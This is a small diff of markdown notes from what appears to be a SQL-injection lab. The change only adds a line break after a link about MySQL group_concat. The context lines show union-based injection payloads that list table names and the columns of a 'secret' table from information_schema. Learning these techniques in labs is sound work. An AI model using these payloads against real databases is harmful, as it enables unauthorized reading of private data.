@@ -169,7 +169,7 @@ h. other data?
 ```javascript
 admin' union SELECT 1, 2, 3, 4, 5, group_concat(table_name) from information_schema.tables where table_schema = 'sqli_5' #
 ```
-- [Find hidden information](https://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group_concat.php)
+- [Find hidden information](https://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group_concat.php)<br>
 i. other data?
 ```javascript
 admin' union select 1,2,3,4,5,column_name from information_schema.columns where table_name = 'secret' #
